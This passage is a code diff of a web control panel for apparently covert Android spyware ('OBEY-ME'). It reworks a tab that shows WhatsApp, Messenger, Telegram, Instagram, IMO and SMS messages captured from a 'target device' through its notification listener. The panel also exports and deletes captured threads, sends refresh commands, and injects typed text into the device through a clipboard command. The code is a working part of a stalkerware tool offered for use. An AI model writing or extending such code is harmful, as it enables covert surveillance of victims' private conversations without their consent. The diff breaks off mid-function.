@@ -1055,38 +1055,101 @@
                 </div>
             </div>
 
-            <!-- TAB 8: Social Chat Feed -->
+            <!-- TAB 8: Social Media & Live Two-Way Chat Hub -->
             <div id="tab-chats" class="tab-content">
-                <div class="card" style="padding: 24px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                <div class="card" style="padding: 20px; min-height: 650px;">
+                    <!-- Top Action Bar & App Filters -->
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; flex-wrap: wrap; gap: 12px;">
                         <div>
-                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
-                                💬 Social Media & Live Chat Feed
+                            <h4 style="font-size: 1.15rem; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; margin: 0 0 4px 0; font-family: 'Outfit', sans-serif;">
+                                <i class="fas fa-comments text-primary-c"></i> Real-Time Two-Way Social Chat Hub
                             </h4>
-                            <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
-                                Read incoming chat messages from social apps.
+                            <p style="font-size: 0.78rem; color: var(--text-secondary); margin: 0;">
+                                Separate threaded conversation view for every contact with two-way incoming and outgoing message bubbles.
                             </p>
                         </div>
-                        <button onclick="devRef.child('commands/refreshChats').set({timestamp: Date.now()})" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);">
-                            <i class="fas fa-sync-alt me-1"></i> Refresh
-                        </button>
+                        <div style="display: flex; gap: 8px; align-items: center;">
+                            <button onclick="exportActiveChatThread()" class="btn-ghost" style="padding: 6px 14px; font-size: 0.76rem; border-radius: var(--radius-pill);" title="Export Chat">
+                                <i class="fas fa-file-export me-1"></i> Export Chat
+                            </button>
+                            <button onclick="refreshAllChats()" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                                <i class="fas fa-sync-alt me-1"></i> Refresh Feed
+                            </button>
+                        </div>
                     </div>
 
-                    <!-- Chat App Tabs -->
+                    <!-- App Filter Pills Bar -->
                     <div style="display: flex; gap: 8px; margin-bottom: 16px; overflow-x: auto; padding-bottom: 4px;">
-                        <button class="btn-ghost" onclick="switchChatApp('all')" id="chat-tab-all" style="padding: 6px 14px; border-radius: var(--radius-pill); border-color: var(--primary); color: var(--primary); background: rgba(255,255,255,0.06);"><i class="fas fa-comments me-1"></i> All Chats</button>
-                        <button class="btn-ghost" onclick="switchChatApp('whatsapp')" id="chat-tab-whatsapp" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-whatsapp me-1"></i> WhatsApp</button>
-                        <button class="btn-ghost" onclick="switchChatApp('messenger')" id="chat-tab-messenger" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-facebook-messenger me-1"></i> Messenger</button>
-                        <button class="btn-ghost" onclick="switchChatApp('telegram')" id="chat-tab-telegram" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-telegram me-1"></i> Telegram</button>
-                        <button class="btn-ghost" onclick="switchChatApp('instagram')" id="chat-tab-instagram" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-instagram me-1"></i> Instagram</button>
-                        <button class="btn-ghost" onclick="switchChatApp('imo')" id="chat-tab-imo" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fas fa-comment-dots me-1"></i> IMO</button>
+                        <button class="btn-ghost active" onclick="switchChatApp('all')" id="chat-tab-all" style="padding: 6px 14px; border-radius: var(--radius-pill); font-size: 0.78rem;"><i class="fas fa-globe me-1"></i> All Apps (<span id="count-all">0</span>)</button>
+                        <button class="btn-ghost" onclick="switchChatApp('whatsapp')" id="chat-tab-whatsapp" style="padding: 6px 14px; border-radius: var(--radius-pill); font-size: 0.78rem;"><i class="fab fa-whatsapp me-1" style="color:#25D366;"></i> WhatsApp (<span id="count-whatsapp">0</span>)</button>
+                        <button class="btn-ghost" onclick="switchChatApp('messenger')" id="chat-tab-messenger" style="padding: 6px 14px; border-radius: var(--radius-pill); font-size: 0.78rem;"><i class="fab fa-facebook-messenger me-1" style="color:#00B2FF;"></i> Messenger (<span id="count-messenger">0</span>)</button>
+                        <button class="btn-ghost" onclick="switchChatApp('telegram')" id="chat-tab-telegram" style="padding: 6px 14px; border-radius: var(--radius-pill); font-size: 0.78rem;"><i class="fab fa-telegram me-1" style="color:#0088cc;"></i> Telegram (<span id="count-telegram">0</span>)</button>
+                        <button class="btn-ghost" onclick="switchChatApp('instagram')" id="chat-tab-instagram" style="padding: 6px 14px; border-radius: var(--radius-pill); font-size: 0.78rem;"><i class="fab fa-instagram me-1" style="color:#E1306C;"></i> Instagram (<span id="count-instagram">0</span>)</button>
+                        <button class="btn-ghost" onclick="switchChatApp('imo')" id="chat-tab-imo" style="padding: 6px 14px; border-radius: var(--radius-pill); font-size: 0.78rem;"><i class="fas fa-comment-dots me-1" style="color:#FFC107;"></i> IMO (<span id="count-imo">0</span>)</button>
+                        <button class="btn-ghost" onclick="switchChatApp('sms')" id="chat-tab-sms" style="padding: 6px 14px; border-radius: var(--radius-pill); font-size: 0.78rem;"><i class="fas fa-sms me-1" style="color:#30d158;"></i> SMS Messages (<span id="count-sms">0</span>)</button>
                     </div>
 
-                    <!-- Chat Messages List -->
-                    <div id="chatMessagesContainer" style="display: flex; flex-direction: column; gap: 12px; max-height: 500px; overflow-y: auto; padding-right: 4px;">
-                        <div class="empty-state">
-                            <i class="fas fa-comment-slash"></i>
-                            <p>No chat messages captured yet. Ensure Notification Listener is enabled on the target device.</p>
+                    <!-- Dual-Pane Social Messenger Interface -->
+                    <div style="display: grid; grid-template-columns: 320px 1fr; gap: 16px; border: 1px solid var(--border); border-radius: 16px; overflow: hidden; background: rgba(10, 8, 14, 0.7); min-height: 540px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);" id="chatDualPaneLayout">
+                        
+                        <!-- Left Pane: Contacts & Conversation Threads List -->
+                        <div style="border-right: 1px solid var(--border); display: flex; flex-direction: column; background: rgba(16, 14, 20, 0.65);">
+                            <!-- Contact Search Bar -->
+                            <div style="padding: 12px; border-bottom: 1px solid var(--border);">
+                                <div style="position: relative;">
+                                    <i class="fas fa-search" style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); font-size: 0.75rem; color: var(--text-muted);"></i>
+                                    <input type="text" id="chatContactSearchInput" oninput="filterChatContacts(this.value)" placeholder="Search contact or chat..." style="width: 100%; background: #1c1a24; border: 1px solid var(--border); border-radius: 20px; padding: 7px 12px 7px 32px; font-size: 0.78rem; color: #fff; outline: none;">
+                                </div>
+                            </div>
+
+                            <!-- Threads List Container -->
+                            <div id="chatThreadsListContainer" style="flex: 1; overflow-y: auto; display: flex; flex-direction: column; max-height: 480px;">
+                                <div style="padding: 24px; text-align: center; color: var(--text-secondary); font-size: 0.8rem;">
+                                    <i class="fas fa-comments" style="font-size: 1.5rem; color: var(--text-muted); margin-bottom: 8px; display: block;"></i>
+                                    Loading conversations...
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right Pane: Active Two-Way Conversation Chat Room -->
+                        <div style="display: flex; flex-direction: column; background: rgba(8, 6, 10, 0.85); position: relative;">
+                            
+                            <!-- Active Chat Header -->
+                            <div id="activeChatHeader" style="padding: 12px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background: rgba(16, 14, 22, 0.75);">
+                                <div style="display: flex; align-items: center; gap: 12px;">
+                                    <div id="activeContactAvatar" style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #0071e3 0%, #00c6ff 100%); display: flex; align-items: center; justify-content: center; font-weight: 800; color: #fff; font-size: 1rem; border: 1px solid rgba(255,255,255,0.2);">
+                                        ?
+                                    </div>
+                                    <div>
+                                        <h5 id="activeContactName" style="font-size: 0.95rem; font-weight: 700; color: #fff; margin: 0 0 2px 0;">Select a Conversation</h5>
+                                        <div style="display: flex; align-items: center; gap: 8px; font-size: 0.72rem; color: var(--text-secondary);">
+                                            <span id="activeAppBadge" class="live-badge" style="font-size: 0.62rem; padding: 1px 6px;">Live Chat</span>
+                                            <span id="activeChatCount">0 messages</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div style="display: flex; gap: 6px;">
+                                    <button onclick="clearActiveThreadHistory()" class="btn-ghost" style="padding: 4px 10px; font-size: 0.72rem; border-radius: 14px; color: var(--primary);" title="Clear this chat">
+                                        <i class="fas fa-trash-alt me-1"></i> Clear
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Two-Way Chat Bubbles Scroll Area -->
+                            <div id="activeChatMessagesArea" style="flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 14px; max-height: 440px; background-image: radial-gradient(rgba(255,255,255,0.03) 1px, transparent 0); background-size: 24px 24px;">
+                                <div class="empty-state" style="margin: auto;">
+                                    <i class="fas fa-paper-plane" style="font-size: 2rem; color: var(--primary); margin-bottom: 10px;"></i>
+                                    <p>Select any contact thread from the left to view the full two-way chat history.</p>
+                                </div>
+                            </div>
+
+                            <!-- Bottom Quick Text Reply Bar -->
+                            <div style="padding: 12px 18px; border-top: 1px solid var(--border); background: rgba(14, 12, 18, 0.8); display: flex; align-items: center; gap: 10px;">
+                                <input type="text" id="chatQuickReplyInput" placeholder="Type a message to inject into device..." style="flex: 1; background: #1c1a24; border: 1px solid var(--border); border-radius: 20px; padding: 8px 16px; font-size: 0.8rem; color: #fff; outline: none;" onkeydown="if(event.key==='Enter') sendDirectChatReply()">
+                                <button onclick="sendDirectChatReply()" class="btn-primary-glow" style="padding: 7px 18px; font-size: 0.78rem; border-radius: 20px; display: inline-flex; align-items: center; gap: 6px;">
+                                    <i class="fas fa-paper-plane"></i> Send
+                                </button>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -3641,123 +3704,442 @@
     // ==========================================
     // 7. Chats & Stealth Extensions
     // ==========================================
+    // 7. Real-Time Two-Way Social Chat Hub Engine
+    // ==========================================
     let activeChatApp = 'all';
+    let activeThreadKey = null;
+    let chatSearchQuery = '';
     const allChatStore = {
         whatsapp: {},
         messenger: {},
         telegram: {},
         instagram: {},
-        imo: {}
+        imo: {},
+        sms: {}
     };
-    
+
+    const CHAT_APP_CONFIG = {
+        whatsapp: { name: 'WhatsApp', color: '#25D366', icon: 'fab fa-whatsapp' },
+        messenger: { name: 'Messenger', color: '#00B2FF', icon: 'fab fa-facebook-messenger' },
+        telegram: { name: 'Telegram', color: '#0088cc', icon: 'fab fa-telegram' },
+        instagram: { name: 'Instagram', color: '#E1306C', icon: 'fab fa-instagram' },
+        imo: { name: 'IMO', color: '#FFC107', icon: 'fas fa-comment-dots' },
+        sms: { name: 'SMS Messages', color: '#30d158', icon: 'fas fa-sms' }
+    };
+
     function switchChatApp(appKey) {
         activeChatApp = appKey;
         
-        // Reset styles for all tabs
-        const apps = ['all', 'whatsapp', 'messenger', 'telegram', 'instagram', 'imo'];
+        const apps = ['all', 'whatsapp', 'messenger', 'telegram', 'instagram', 'imo', 'sms'];
         apps.forEach(a => {
             const el = document.getElementById('chat-tab-' + a);
-            if (el) {
-                el.style.borderColor = 'var(--border)';
-                el.style.color = 'var(--text-muted)';
-                el.style.background = 'transparent';
-            }
+            if (el) el.classList.remove('active');
         });
         
-        // Active style based on app
         const activeEl = document.getElementById('chat-tab-' + appKey);
-        if (activeEl) {
-            let color = 'var(--primary)';
-            if (appKey === 'whatsapp') color = '#25D366';
-            else if (appKey === 'messenger') color = '#00B2FF';
-            else if (appKey === 'telegram') color = '#0088cc';
-            else if (appKey === 'instagram') color = '#E1306C';
-            else if (appKey === 'imo') color = '#FFC107';
-            else if (appKey === 'all') color = 'var(--primary)';
-            
-            activeEl.style.borderColor = color;
-            activeEl.style.color = color;
-            activeEl.style.background = 'rgba(255,255,255,0.06)';
-        }
+        if (activeEl) activeEl.classList.add('active');
         
-        renderCurrentChatView();
+        renderSocialChatHub();
     }
-    
-    function renderCurrentChatView() {
-        const container = document.getElementById('chatMessagesContainer');
-        if (!container) return;
-        
-        let msgs = [];
-        if (activeChatApp === 'all') {
-            ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo'].forEach(app => {
-                const appData = allChatStore[app] || {};
-                for (const k in appData) {
-                    msgs.push(appData[k]);
-                }
-            });
-        } else {
-            const appData = allChatStore[activeChatApp] || {};
-            for (const k in appData) {
-                msgs.push(appData[k]);
-            }
+
+    function filterChatContacts(query) {
+        chatSearchQuery = (query || '').toLowerCase().trim();
+        renderSocialChatHub(false);
+    }
+
+    function normalizeThreadSender(rawSender, isOutgoing) {
+        if (!rawSender) return 'Unknown Contact';
+        let s = rawSender.trim();
+        if (isOutgoing || s.toLowerCase() === 'you' || s.toLowerCase() === 'me') {
+            return 'You';
         }
-        
-        if (msgs.length === 0) {
-            container.innerHTML = `
-                <div class="empty-state">
-                    <i class="fas fa-comment-slash"></i>
-                    <p>No chat messages captured yet for ${activeChatApp.toUpperCase()}. Incoming messages from WhatsApp, Messenger, Telegram, Instagram, and IMO will appear here automatically.</p>
+        return s;
+    }
+
+    function buildChatThreads() {
+        const threads = {};
+        const appCounts = { all: 0, whatsapp: 0, messenger: 0, telegram: 0, instagram: 0, imo: 0, sms: 0 };
+
+        // 1. Gather all messages across all apps
+        ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo', 'sms'].forEach(app => {
+            const appStore = allChatStore[app] || {};
+            for (const key in appStore) {
+                const item = appStore[key];
+                if (!item || (!item.body && !item.text)) continue;
+
+                const body = (item.body || item.text || '').trim();
+                const rawSender = (item.sender || item.contact || item.title || 'Unknown').trim();
+                const time = item.time ? parseInt(item.time) : Date.now();
+                const isOutgoing = item.isOutgoing === true || rawSender.toLowerCase() === 'you' || rawSender.toLowerCase() === 'me' || rawSender.startsWith('You:');
+
+                // Determine contact name for the thread
+                let contactName = rawSender;
+                if (isOutgoing) {
+                    contactName = item.contact || item.recipient || 'Conversation';
+                }
+
+                // Clean contact name
+                if (contactName.includes(':')) {
+                    contactName = contactName.split(':')[0].trim();
+                }
+                if (!contactName) contactName = 'Unknown';
+
+                const threadId = `${app}_${contactName.toLowerCase().replace(/[^a-z0-9]/g, '_')}`;
+
+                if (!threads[threadId]) {
+                    threads[threadId] = {
+                        id: threadId,
+                        contactName: contactName,
+                        app: app,
+                        lastTime: 0,
+                        lastMessage: '',
+                        messages: []
+                    };
+                }
+
+                threads[threadId].messages.push({
+                    id: key,
+                    sender: isOutgoing ? 'You' : contactName,
+                    body: body,
+                    time: time,
+                    isOutgoing: isOutgoing,
+                    app: app
+                });
+
+                if (time > threads[threadId].lastTime) {
+                    threads[threadId].lastTime = time;
+                    threads[threadId].lastMessage = (isOutgoing ? 'You: ' : '') + body;
+                }
+
+                appCounts[app]++;
+                appCounts.all++;
+            }
+        });
+
+        // Update Pill Counts
+        for (const k in appCounts) {
+            const countEl = document.getElementById(`count-${k}`);
+            if (countEl) countEl.textContent = appCounts[k];
+        }
+
+        // Sort messages inside each thread chronologically (oldest to newest)
+        for (const tid in threads) {
+            threads[tid].messages.sort((a, b) => a.time - b.time);
+        }
+
+        return threads;
+    }
+
+    function renderSocialChatHub(autoSelectFirst = true) {
+        const threadsMap = buildChatThreads();
+        const threadsListContainer = document.getElementById('chatThreadsListContainer');
+        if (!threadsListContainer) return;
+
+        // Filter threads by active app and search query
+        let threadArray = Object.values(threadsMap);
+        if (activeChatApp !== 'all') {
+            threadArray = threadArray.filter(t => t.app === activeChatApp);
+        }
+        if (chatSearchQuery) {
+            threadArray = threadArray.filter(t => 
+                t.contactName.toLowerCase().includes(chatSearchQuery) ||
+                t.lastMessage.toLowerCase().includes(chatSearchQuery)
+            );
+        }
+
+        // Sort threads by most recent message time descending
+        threadArray.sort((a, b) => b.lastTime - a.lastTime);
+
+        if (threadArray.length === 0) {
+            threadsListContainer.innerHTML = `
+                <div style="padding: 32px 16px; text-align: center; color: var(--text-secondary); font-size: 0.8rem;">
+                    <i class="fas fa-comment-slash" style="font-size: 1.8rem; color: var(--text-muted); margin-bottom: 10px; display: block;"></i>
+                    No conversations found for ${activeChatApp.toUpperCase()}.
                 </div>`;
+            renderActiveThreadMessages(null);
             return;
         }
-        
-        msgs.sort((a, b) => (b.time || 0) - (a.time || 0)); // Newest first
-        
-        let html = '';
-        msgs.forEach(msg => {
-            const sender = msg.sender || 'Unknown';
-            const body = msg.body || '';
-            const app = (msg.app || 'chat').toLowerCase();
-            const time = msg.time ? new Date(msg.time).toLocaleString() : '';
-            const initial = sender.charAt(0).toUpperCase();
-            
-            let appColor = '#25D366';
-            let appLabel = 'WhatsApp';
-            let appIcon = 'fab fa-whatsapp';
-            
-            if (app === 'messenger') { appColor = '#00B2FF'; appLabel = 'Messenger'; appIcon = 'fab fa-facebook-messenger'; }
-            else if (app === 'telegram') { appColor = '#0088cc'; appLabel = 'Telegram'; appIcon = 'fab fa-telegram'; }
-            else if (app === 'instagram') { appColor = '#E1306C'; appLabel = 'Instagram'; appIcon = 'fab fa-instagram'; }
-            else if (app === 'imo') { appColor = '#FFC107'; appLabel = 'IMO'; appIcon = 'fas fa-comment-dots'; }
-            
-            html += `
-            <div style="display: flex; gap: 12px; align-items: flex-start; margin-bottom: 12px; width: 100%;">
-                <div style="width: 38px; height: 38px; border-radius: 50%; background: ${appColor}22; border: 1px solid ${appColor}55; display: flex; align-items: center; justify-content: center; font-weight: 700; color: ${appColor}; flex-shrink: 0; font-size: 0.9rem;">
-                    ${initial}
+
+        // Render Left Pane Threads List
+        let listHtml = '';
+        threadArray.forEach(t => {
+            const appConf = CHAT_APP_CONFIG[t.app] || { name: t.app, color: '#0071e3', icon: 'fas fa-comment' };
+            const initial = t.contactName.charAt(0).toUpperCase();
+            const timeStr = formatChatThreadTime(t.lastTime);
+            const isActive = activeThreadKey === t.id;
+
+            listHtml += `
+            <div onclick="selectChatThread('${escapeHtml(t.id)}')" style="padding: 12px 14px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); cursor: pointer; transition: all 0.15s ease; background: ${isActive ? 'rgba(0, 113, 227, 0.15)' : 'transparent'}; border-left: 3px solid ${isActive ? 'var(--primary)' : 'transparent'};">
+                <div style="position: relative; flex-shrink: 0;">
+                    <div style="width: 42px; height: 42px; border-radius: 50%; background: ${appConf.color}22; border: 1.5px solid ${appConf.color}66; display: flex; align-items: center; justify-content: center; font-weight: 800; color: ${appConf.color}; font-size: 1rem;">
+                        ${initial}
+                    </div>
+                    <span style="position: absolute; bottom: -2px; right: -2px; width: 16px; height: 16px; border-radius: 50%; background: #1c1a24; border: 1px solid ${appConf.color}; display: flex; align-items: center; justify-content: center; font-size: 8px; color: ${appConf.color};">
+                        <i class="${appConf.icon}"></i>
+                    </span>
                 </div>
-                <div style="background: rgba(255,255,255,0.04); border: 1px solid var(--border); border-left: 3px solid ${appColor}; padding: 12px 16px; border-radius: 14px; max-width: 85%; flex: 1;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 6px;">
-                        <span style="font-size: 0.82rem; font-weight: 700; color: #fff;">${escapeHtml(sender)}</span>
-                        <span class="live-badge" style="font-size: 0.65rem; background: ${appColor}18; color: ${appColor}; border: 1px solid ${appColor}40;">
-                            <i class="${appIcon}" style="margin-right: 3px;"></i> ${appLabel}
+                <div style="flex: 1; min-width: 0;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px;">
+                        <span style="font-weight: 700; color: #fff; font-size: 0.85rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 140px;">${escapeHtml(t.contactName)}</span>
+                        <span style="font-size: 0.68rem; color: var(--text-muted);">${timeStr}</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-size: 0.74rem; color: ${isActive ? '#fff' : 'var(--text-secondary)'}; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 170px;">
+                            ${escapeHtml(t.lastMessage || 'No messages')}
+                        </span>
+                        <span style="font-size: 0.62rem; background: ${appConf.color}15; color: ${appConf.color}; border: 1px solid ${appConf.color}35; padding: 1px 5px; border-radius: 10px; font-weight: 600;">
+                            ${t.messages.length}
                         </span>
                     </div>
-                    <div style="font-size: 0.88rem; color: #ddd; word-break: break-word; line-height: 1.45; white-space: pre-wrap;">${escapeHtml(body)}</div>
-                    <div style="font-size: 0.68rem; color: var(--text-muted); text-align: right; margin-top: 6px;">${time}</div>
                 </div>
             </div>`;
         });
-        
-        container.innerHTML = html;
+
+        threadsListContainer.innerHTML = listHtml;
+
+        // Auto select first thread if none is selected
+        if ((!activeThreadKey || !threadsMap[activeThreadKey]) && autoSelectFirst && threadArray.length > 0) {
+            activeThreadKey = threadArray[0].id;
+            selectChatThread(activeThreadKey);
+        } else if (activeThreadKey && threadsMap[activeThreadKey]) {
+            renderActiveThreadMessages(threadsMap[activeThreadKey]);
+        }
     }
-    
+
+    function selectChatThread(threadId) {
+        activeThreadKey = threadId;
+        const threadsMap = buildChatThreads();
+        const activeThread = threadsMap[threadId];
+
+        // Highlight active left thread item
+        renderSocialChatHub(false);
+        renderActiveThreadMessages(activeThread);
+    }
+
+    function renderActiveThreadMessages(thread) {
+        const msgArea = document.getElementById('activeChatMessagesArea');
+        const headerName = document.getElementById('activeContactName');
+        const headerAvatar = document.getElementById('activeContactAvatar');
+        const headerBadge = document.getElementById('activeAppBadge');
+        const headerCount = document.getElementById('activeChatCount');
+
+        if (!thread) {
+            if (headerName) headerName.textContent = 'No Active Conversation';
+            if (headerAvatar) headerAvatar.textContent = '?';
+            if (headerBadge) headerBadge.textContent = 'Social Feed';
+            if (headerCount) headerCount.textContent = '0 messages';
+            if (msgArea) {
+                msgArea.innerHTML = `
+                <div class="empty-state" style="margin: auto;">
+                    <i class="fas fa-comments" style="font-size: 2.2rem; color: var(--primary); margin-bottom: 12px;"></i>
+                    <p>Select any contact from the left list to view their two-way incoming and outgoing message history.</p>
+                </div>`;
+            }
+            return;
+        }
+
+        const appConf = CHAT_APP_CONFIG[thread.app] || { name: thread.app, color: '#0071e3', icon: 'fas fa-comment' };
+        const initial = thread.contactName.charAt(0).toUpperCase();
+
+        if (headerName) headerName.textContent = thread.contactName;
+        if (headerAvatar) {
+            headerAvatar.textContent = initial;
+            headerAvatar.style.background = `${appConf.color}33`;
+            headerAvatar.style.borderColor = appConf.color;
+            headerAvatar.style.color = appConf.color;
+        }
+        if (headerBadge) {
+            headerBadge.innerHTML = `<i class="${appConf.icon}" style="margin-right: 4px;"></i> ${appConf.name}`;
+            headerBadge.style.background = `${appConf.color}22`;
+            headerBadge.style.color = appConf.color;
+            headerBadge.style.borderColor = `${appConf.color}55`;
+        }
+        if (headerCount) {
+            headerCount.textContent = `${thread.messages.length} messages in conversation`;
+        }
+
+        if (!msgArea) return;
+
+        let html = '';
+        let lastDateStr = '';
+
+        thread.messages.forEach(msg => {
+            const msgDate = new Date(msg.time);
+            const dateStr = msgDate.toLocaleDateString([], { month: 'short', day: 'numeric', year: 'numeric' });
+            const timeStr = msgDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+            // Date separator pill
+            if (dateStr !== lastDateStr) {
+                lastDateStr = dateStr;
+                html += `
+                <div style="text-align: center; margin: 12px 0;">
+                    <span style="background: rgba(255,255,255,0.06); border: 1px solid var(--border); border-radius: 12px; padding: 3px 12px; font-size: 0.68rem; color: var(--text-secondary); font-weight: 600;">
+                        ${dateStr}
+                    </span>
+                </div>`;
+            }
+
+            if (msg.isOutgoing) {
+                // Outgoing Message Bubble (Right-aligned, Blue Gradient)
+                html += `
+                <div style="align-self: flex-end; max-width: 75%; display: flex; flex-direction: column; align-items: flex-end;">
+                    <div style="background: linear-gradient(135deg, #0071e3 0%, #0056b3 100%); color: #fff; border: 1px solid rgba(255,255,255,0.25); border-radius: 16px 16px 4px 16px; padding: 10px 14px; box-shadow: 0 4px 14px rgba(0, 113, 227, 0.35);">
+                        <div style="font-size: 0.85rem; line-height: 1.45; word-break: break-word; white-space: pre-wrap;">${escapeHtml(msg.body)}</div>
+                        <div style="display: flex; align-items: center; justify-content: flex-end; gap: 4px; font-size: 0.62rem; color: rgba(255,255,255,0.7); margin-top: 4px;">
+                            <span>${timeStr}</span>
+                            <i class="fas fa-check-double" style="color: #64d2ff; font-size: 9px;"></i>
+                        </div>
+                    </div>
+                </div>`;
+            } else {
+                // Incoming Message Bubble (Left-aligned, Dark Graphite Glass)
+                html += `
+                <div style="align-self: flex-start; max-width: 75%; display: flex; gap: 8px; align-items: flex-start;">
+                    <div style="width: 28px; height: 28px; border-radius: 50%; background: ${appConf.color}22; border: 1px solid ${appConf.color}66; display: flex; align-items: center; justify-content: center; font-weight: 700; color: ${appConf.color}; font-size: 0.72rem; flex-shrink: 0; margin-top: 4px;">
+                        ${initial}
+                    </div>
+                    <div style="background: rgba(28, 24, 34, 0.95); color: #fff; border: 1px solid rgba(255,255,255,0.1); border-left: 3px solid ${appConf.color}; border-radius: 4px 16px 16px 16px; padding: 10px 14px; box-shadow: 0 4px 14px rgba(0,0,0,0.5);">
+                        <div style="font-size: 0.72rem; font-weight: 700; color: ${appConf.color}; margin-bottom: 3px;">${escapeHtml(msg.sender)}</div>
+                        <div style="font-size: 0.85rem; line-height: 1.45; color: #e5e5ea; word-break: break-word; white-space: pre-wrap;">${escapeHtml(msg.body)}</div>
+                        <div style="font-size: 0.62rem; color: var(--text-muted); text-align: right; margin-top: 4px;">
+                            ${timeStr}
+                        </div>
+                    </div>
+                </div>`;
+            }
+        });
+
+        msgArea.innerHTML = html;
+
+        // Auto-scroll to latest message at bottom
+        setTimeout(() => {
+            msgArea.scrollTop = msgArea.scrollHeight;
+        }, 80);
+    }
+
+    function formatChatThreadTime(timestamp) {
+        if (!timestamp) return '';
+        const date = new Date(timestamp);
+        const now = new Date();
+        if (date.toDateString() === now.toDateString()) {
+            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        }
+        return date.toLocaleDateString([], { month: 'short', day: 'numeric' });
+    }
+
+    function exportActiveChatThread() {
+        const threadsMap = buildChatThreads();
+        if (!activeThreadKey || !threadsMap[activeThreadKey]) {
+            alert("Please select a conversation thread to export.");
+            return;
+        }
+        const thread = threadsMap[activeThreadKey];
+        let txt = `========================================\n`;
+        txt += `OBEY-ME REAL-TIME CHAT EXPORT\n`;
+        txt += `Contact: ${thread.contactName}\n`;
+        txt += `App: ${thread.app.toUpperCase()}\n`;
+        txt += `Exported: ${new Date().toLocaleString()}\n`;
+        txt += `Total Messages: ${thread.messages.length}\n`;
+        txt += `========================================\n\n`;
+
+        thread.messages.forEach(m => {
+            const time = new Date(m.time).toLocaleString();
+            txt += `[${time}] ${m.sender}: ${m.body}\n`;
+        });
+
+        const blob = new Blob([txt], { type: 'text/plain;charset=utf-8' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `chat_${thread.app}_${thread.contactName}_${Date.now()}.txt`;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }
+
+    function clearActiveThreadHistory() {
+        const threadsMap = buildChatThreads();
+        if (!activeThreadKey || !threadsMap[activeThreadKey]) return;
+        const thread = threadsMap[activeThreadKey];
+        if (!confirm(`Are you sure you want to clear the conversation history with ${thread.contactName}?`)) return;
+
+        // Remove from Firebase under chats/{app}/messages where contact matches
+        devRef.child(`chats/${thread.app}/messages`).once('value', snap => {
+            const data = snap.val() || {};
+            for (const key in data) {
+                const item = data[key];
+                const s = (item.sender || item.contact || '').toLowerCase();
+                if (s.includes(thread.contactName.toLowerCase())) {
+                    devRef.child(`chats/${thread.app}/messages/${key}`).remove();
+                }
+            }
+            alert("Chat thread cleared.");
+        });
+    }
+
+    function sendDirectChatReply() {
+        const input = document.getElementById('chatQuickReplyInput');
+        if (!input) return;
+        const text = input.value.trim();
+        if (!text) return;
+
+        const threadsMap = buildChatThreads();
+        const thread = activeThreadKey ? threadsMap[activeThreadKey] : null;
+        const app = thread ? thread.app : 'whatsapp';
+        const contact = thread ? thread.contactName : 'Direct Reply';
+
+        // 1. Save directly to Firebase chat stream as Outgoing message
+        devRef.child(`chats/${app}/messages`).push().setValue({
+            sender: 'You',
+            body: text,
+            isOutgoing: true,
+            app: app,
+            contact: contact,
+            time: Date.now()
+        });
+
+        // 2. Also send clipboard/text injection command to device
+        devRef.child('commands/clipboard').set({
+            text: text,
+            timestamp: Date.now()
+        });
+
+        input.value = '';
+    }
+
+    function refreshAllChats() {
+        devRef.child('commands/refreshChats').set({ timestamp: Date.now() });
+        renderSocialChatHub();
+    }
+
+    // Set up Realtime Listeners for all chat apps
     function setupChatListeners() {
-        const apps = ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo'];
+        const apps = ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo', 'sms'];
         apps.forEach(app => {
             devRef.child('chats/' + app + '/messages').on('value', snap => {
                 allChatStore[app] = snap.val() || {};
-                renderCurrentChatView();
+                renderSocialChatHub(false);
             });
+        });
+
+        // Also listen for general SMS list and integrate with chat hub
+        devRef.child('sms/list').on('value', snap => {
+            const smsData = snap.val() || {};
+            const items = Array.isArray(smsData) ? smsData : Object.values(smsData);
+            const converted = {};
+            items.forEach((s, idx) => {
+                const id = s.id || `sms_${idx}`;
+                const isOut = s.type === 'sent' || s.type === '2' || s.isOutgoing === true;
+                converted[id] = {
+                    sender: isOut ? 'You' : (s.address || s.name || 'SMS Contact'),
+                    contact: s.address || s.name || 'SMS Contact',
+                    body: s.body || s.msg || '',
+                    time: s.date ? parseInt(s.date) : (s.time || Date.now()),
+                    isOutgoing: isOut,
